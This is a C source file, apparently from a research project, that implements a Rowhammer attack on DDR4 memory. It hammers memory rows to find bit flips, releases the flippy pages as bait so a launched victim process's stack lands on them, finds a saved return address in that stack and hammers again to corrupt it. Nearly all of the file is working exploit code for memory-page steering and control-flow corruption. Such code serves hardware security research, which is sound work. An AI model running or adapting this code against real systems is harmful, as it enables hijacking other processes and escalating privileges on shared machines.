
#include "../include/misc.h"
#include "../include/spoiler.h"
#include "../include/drama.h"
#include "../include/stack.h"
#include "../include/process_handling.h"



extern int ret_created;
#define ATTACKER_VALUE 0xFF
#define VICTIM_VALUE 0x00
#define N_SIDED 10
#define HAMMER_TIMES 1000000
// #define HAMMER_TIMES 1000
#include <x86intrin.h>
#define HEAP 1

#define SEARCH_SPACE 200
#define PC_DISTANCE 5120


uint64_t rdtsc()
{
	return __rdtsc();
}

void read_bin()
{
	const char *filePath = "/home/berksunar/stack_attack/Dropbox/memory_mayhem/image_demo/file.bin";
	int fd;
	struct stat fileInfo;
	void *fileMemory;

	// Open the file for reading.
	fd = open(filePath, O_RDONLY);
	if (fd == -1)
	{
		perror("Error opening file");
		exit(EXIT_FAILURE);
	}

	// Get the file size.
	if (fstat(fd, &fileInfo) == -1)
	{
		perror("Error getting file size");
		close(fd);
		exit(EXIT_FAILURE);
	}

	// Memory-map the file.
	fileMemory = mmap(NULL, fileInfo.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (fileMemory == MAP_FAILED)
	{
		perror("Error mapping file");
		close(fd);
		exit(EXIT_FAILURE);
	}

	// Access all the bytes in the memory-mapped file.
	for (size_t i = 0; i < fileInfo.st_size; i++)
	{
		// Access the byte at index i.
		unsigned char byte = ((unsigned char *)fileMemory)[i];
		// Do something with the byte (e.g., print it).
		// printf("Byte %zu: %02x\n", i, byte);
	}

	// Pass the virtual address of the file to the getPhysicalAddress function.
	FILE *fp_phy;
	fp_phy = fopen("physical_address.txt", "w+");
	fprintf(fp_phy, "%lx\n", get_physical_addr((uint64_t)fileMemory));
	fflush(fp_phy);

	// Clean up.
	munmap(fileMemory, fileInfo.st_size);
	close(fd);
}

// Function that initializes the victim addresses to some value
void init_victims(struct addr_space *myBank, int row)
{
	// Initializing the victim pages
	for (int n = 2; n <= 4 * (N_SIDED - 1); n = n + 4)
	{
		for (int y = 0; y < PAGE_SIZE; y++)
		{
			*(myBank->memory_addresses[((row + n))]+y) = VICTIM_VALUE;

		}
	}
}

// Function that initializes the attacker addresses to some value
void init_attackers(struct addr_space *myBank, int row)
{
	// Initializing the attacker pages
	for (int n = 0; n <= 4 * (N_SIDED - 1); n = n + 4)
	{
		for (int y = 0; y < PAGE_SIZE; y++)
		{
			*(myBank->memory_addresses[((row + n))]+y) = ATTACKER_VALUE;
		}
	}
}

// Actual hammer function
void hammer_rows(struct addr_space *myBank, int row)
{
	DRAMAddr dram_adr = {0, 0, 0};
	uint64_t physical_adr;
	uint64_t prev_physical_adr = 0;

	int max_run = 0;
	int current_bank = 0;

	for (int t = 0; t < HAMMER_TIMES; t++)
	{
		for (int n = 0; n <= 4 * (N_SIDED - 1); n = n + 4)
		{
			hammer_single((uint64_t)myBank->memory_addresses[((row + n))]);
		}
		asm("mfence");
	}
}

int check_for_flip(struct addr_space *myBank, int row)
{
	int flip = 0;
	for (int n = 2; n <= 4 * (N_SIDED - 1); n = n + 4)
	{
		for (int y = 0; y < PAGE_SIZE; y++)
		{
			// printf("%02x", *(myBank->memory_addresses[((row + n))] + y));
			if (*(myBank->memory_addresses[((row + n))] + y) != VICTIM_VALUE)
			{
				time_t rawtime;
				struct tm *timeinfo;
				char buffer[80];

				time(&rawtime);
				timeinfo = localtime(&rawtime);

				strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);

				printf("%s %lx 0->1 FLIP at page offset %03x\tvalue %02x\n", buffer, get_physical_addr((uint64_t)myBank->memory_addresses[((row + n))]), y, *(myBank->memory_addresses[((row + n))] + y));
				flip = 1;
			}
		}
	}
	return flip;
}


int attack_program(struct addr_space *myBank, int row, char *program, int NUM_PAGES)
{
	uint64_t PC_addr;
	uint64_t phys_addr_target;
	int learned_baits = 0;
	for (int n = 2; n <= 4 * (N_SIDED - 1); n = n + 4)
	{
		for (int y = 0; y < PAGE_SIZE; y++)
		{
			if (*(myBank->memory_addresses[((row + n))] + y) != VICTIM_VALUE)
			{
				uint64_t flippy_physical = get_physical_addr((uint64_t)myBank->memory_addresses[((row + n))]);
				time_t rawtime;
				struct tm *timeinfo;
				char buffer[80];
				time(&rawtime);
				timeinfo = localtime(&rawtime);
				strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
				printf("%s %lx 0->1 FLIP at page offset %03x\tvalue %02x\n", buffer, get_physical_addr((uint64_t)myBank->memory_addresses[((row + n))]), y, *(myBank->memory_addresses[((row + n))] + y));
				// check if y's last character is 8, 9, a, b, c, d, e or f
				if(1){//(y%16 == 0x8 || y%16 == 0x9 || y%16 == 0xa || y%16 == 0xb || y%16 == 0xc || y%16 == 0xd || y%16 == 0xe || y%16 == 0xf)
					// printf("Flip in the correct interval\n");
					// Create an array for the physical addresses
					uint64_t physical_addresses[NUM_PAGES];

					// Allocate memory with mmap
					void *addr = mmap(NULL, NUM_PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
					if (addr == MAP_FAILED)
					{
						perror("mmap");
						exit(1);
					}
					// access every page
					// for()

					// Print how much memory we can unmap after the flippy page (these will be consumed before the flippy page)
					// If we can unmap enough pages, do so, otherwise print and return
					// Record the bait pages in the bait pages text file

					/*
					----- [0]
					----- [1]
					----- [...]
					----- //Flippy page (row + n)
					----- 
					----- [myBank->length-1]
					*/

					int bait_pages_available = myBank->length - (row + n) - 1;
					printf("Bait pages available: %d\n", bait_pages_available);
					// munmap(myBank->memory_addresses[((row + n))], PAGE_SIZE); // flippy

					if(bait_pages_available < NUM_PAGES){
						printf("Not enough bait pages available\n");
						return false;
					}

					printf("Allocated memory\n");

					// Save physical addresses to a file
					FILE *fp = fopen("bait_pages.txt", "w+");
					if (fp == NULL)
					{
						perror("fopen");
						exit(1);
					}

					for (int i = 0; i < NUM_PAGES; i++)
					{
						uint64_t virtual_addr = (uint64_t)myBank->memory_addresses[((row + n))] + i * PAGE_SIZE;
						uint64_t physical_addr = get_physical_addr(virtual_addr);
						fprintf(fp, "%lx\n", physical_addr);
						physical_addresses[i] = physical_addr;
					}

					fclose(fp);

					// read delay from file
					int DELAY= 1;

					int core = get_current_cpu();

					char cmd[100];
					sprintf(cmd, "taskset -c %d %s &", core, program);


					munmap(myBank->memory_addresses[((row + n))], PAGE_SIZE*NUM_PAGES); // flippy


					// Skip all the unmapped pages for the next loop
					row = row + NUM_PAGES;

					int pid = launch_process("./victims/bin/victim");
    				sleep(DELAY);

					// Read and save the stack of the launched program
					StackEntry *stack_entries;
					uint64_t PC_value = 0xdeadbeef;// 0x555555635860;//0x55555559c4c5; // 
					// Check stack for code address (return virtual address)
					int num_entries = read_stack(pid, &stack_entries); // Replace 1234 with the actual PID
					if(num_entries > 0){
						PC_addr = find_integer_in_stack(stack_entries, num_entries, PC_value);
						if (PC_addr == 0)
						{
							printf("Could not find target data\n");
							return false;
						}
						else{
							// printf("\rFound target data at v_addr %lx\n", PC_addr);
							phys_addr_target = get_physical_addr_pid(PC_addr, pid) & ~0xFFF;
							// printf("\rPhysical address of target data: %lx\n", phys_addr_target );  
						}
					}
					else{
						printf("\rNo entries found\n");
						return false;
					}
					// uint64_t addr = find_integer_in_stack(stack_entries, num_entries, TARGET_DATA);
					printf("Found target data at v_addr %lx\n", PC_addr);
					uint64_t phys_addr_target = get_physical_addr_pid(PC_addr, pid) & ~0xFFF;
					// printf("Physical address of target data: %lx\n", phys_addr_target);

					int found_phys = 0;
					printf("Flippy physical address: %lx\n", flippy_physical);
					printf("Target physical address: %lx\n", phys_addr_target);
					if (flippy_physical == phys_addr_target){
						printf("Flippy Success: %lx v_addr:%lx phys_addr:%lx\n", PC_value, PC_addr, phys_addr_target);
						found_phys = 1;
						learned_baits = NUM_PAGES;
						// break;
					}
					else{
						for (int i = 0; i < NUM_PAGES; i++){
							// printf("Physical address %d: %lx - target %lx\n", i, physical_addresses[i], phys_addr_target);
							if (physical_addresses[i] == phys_addr_target){
								printf("Bait Success: %lx v_addr:%lx phys_addr:%lx bait page:%d\n", PC_value, PC_addr, phys_addr_target, i);
								found_phys = 1;
								learned_baits = i;
								// break;
							}
						}
						// getchar();
					}
					if (!found_phys){
						printf("Target not in bait pages\n");
					}

					// Hammer the rows
					//uint64_t LAST_12_BITS = 0x4c5;
					//if(PC_value && 0xFFF == LAST_12_BITS){
						hammer_rows(myBank, row);
					//}
					num_entries = read_stack(pid, &stack_entries); // Replace 1234 with the actual PID
					for (int i = 0; i < num_entries; i++){
						if (stack_entries[i].address == PC_addr){
							if (stack_entries[i].value != PC_value){
								printf("Old PC value: %lx\n", PC_value);
								printf("New PC value: %lx\n", stack_entries[i].value);
								printf("PC value changed! ##############\n");
							}
							PC_value = stack_entries[i].value;
							break;
						}
					}
					
					printf("\n");
					// Free stack entries
					free(stack_entries);
					return learned_baits;

				}
				}
			}
		}
	}

// Function that finds flips in the memory
void profileDDR4(struct addr_space *myBank)
{
	clock_t cl;
	float online_time = 0.0;

	int PAGES_PER_SIDE = 4; // two attacker to victim
	int ATTACK_GROUP_LENGTH = PAGES_PER_SIDE * (N_SIDED - 1);
	int max_h_index = (myBank->length) -
					  ((myBank->length) % ATTACK_GROUP_LENGTH) - ATTACK_GROUP_LENGTH;

	for (int row = 0; row <= max_h_index; row += ATTACK_GROUP_LENGTH)
	{
		// Filling the Victim and Neighboring Rows with Own Data
		// Not getting flips if victim initialized with 0x00
		printf("Hammering row %d  v-address %p (physical %lx)\n",
			   row + 2,
			   myBank->memory_addresses[((row))],
			   get_physical_addr((uint64_t)myBank->memory_addresses[((row))]));

		// Initializing the attacker pages
		init_attackers(myBank, row);

		// Initializing the victim pages
		init_victims(myBank, row);

		// Hammer the rows
		hammer_rows(myBank, row);

		// Checking for Bit Flips
		check_for_flip(myBank, row);
	}
	return;
}

// }
// Function that finds flips in the memory
void getFlippyAddressesDDR4(struct addr_space *myBank)
{

	clock_t cl;
	float online_time = 0.0;

	int PAGES_PER_SIDE = 4; // two attacker to victim
	int ATTACK_GROUP_LENGTH = PAGES_PER_SIDE * (N_SIDED - 1);
	int max_h_index = (myBank->length) -
					  ((myBank->length) % ATTACK_GROUP_LENGTH) - ATTACK_GROUP_LENGTH;

	int baits = 100;
	for (int row = 0; row <= max_h_index; row += ATTACK_GROUP_LENGTH)
	{
		// Filling the Victim and Neighboring Rows with Own Data
		// Not getting flips if victim initialized with 0x00
		printf("Hammering row %d  v-address %p (physical %lx)\n",
			   row + 2,
			   myBank->memory_addresses[((row))],
			   get_physical_addr((uint64_t)myBank->memory_addresses[((row))]));

		// Initializing the attacker pages
		init_attackers(myBank, row);

		// Initializing the victim pages
		init_victims(myBank, row);

		// Hammer the rows
		hammer_rows(myBank, row);

		// Checking for Bit Flips
		check_for_flip(myBank, row);

		int new_baits = attack_program(myBank, row, "taskset -c 6 ./victims/bin/victim", baits);

		if(new_baits != 0){
			baits = new_baits;
		}

	}
	return;
}

uint64_t find_fingerprint(StackEntry *stack_entries, int num_entries, const char *fingerprint_file)
{
	FingerprintEntry fingerprint[5]; // Assuming you read only first 5 lines
	uint64_t max_matches = 0;
	uint64_t start_addr = 0;

	// Load fingerprint from file (simplified)
	FILE *fp = fopen(fingerprint_file, "r");
	for (int i = 0; i < 5; i++)
	{
		fscanf(fp, "%lx, %lu\n", &fingerprint[i].val, &fingerprint[i].dist);
	}
	fclose(fp);

	printf("\n");
	// print fingerprint
	printf("Fingerprint:\n");
	for (int i = 0; i < 5; i++)
	{
		printf("%lx, %lu\n", fingerprint[i].val, fingerprint[i].dist);
	}
	printf("\n");

	printf("Number of stack entries: %d\n", num_entries);

	// Sliding fingerprint along the stack
	for (int i = 0; i < num_entries; i++)
	{
		uint64_t matches = 0;
		for (int j = i; j < num_entries && j < i + SEARCH_SPACE; j++)
		{
			uint64_t diff = stack_entries[j].address - stack_entries[i].address;
			for (int k = 0; k < 5; k++)
			{ // Hardcoded to 5 for simplicity
				if (diff == fingerprint[k].dist)
				{
					if (fingerprint[k].val == stack_entries[j].value)
					{
						printf("Found %lx at %lx\n", fingerprint[k].val, stack_entries[j].address);
						matches++;
						break; // No need to check other fingerprint entries
					}
				}
			}
		}

		// Update if this window is better than previous best
		if (matches > max_matches)
		{
			max_matches = matches;
			start_addr = stack_entries[i].address;
		}
	}
	printf("\n");

	return start_addr;
}

int get_current_cpu()
{
	cpu_set_t mask;
	CPU_ZERO(&mask);

	if (sched_getaffinity(0, sizeof(cpu_set_t), &mask) == -1)
	{
		perror("sched_getaffinity");
		exit(1);
	}

	for (int i = 0; i < CPU_SETSIZE; ++i)
	{
		if (CPU_ISSET(i, &mask))
		{
			return i; // Return the first CPU in the set
		}
	}

	return -1; // Should not happen
}
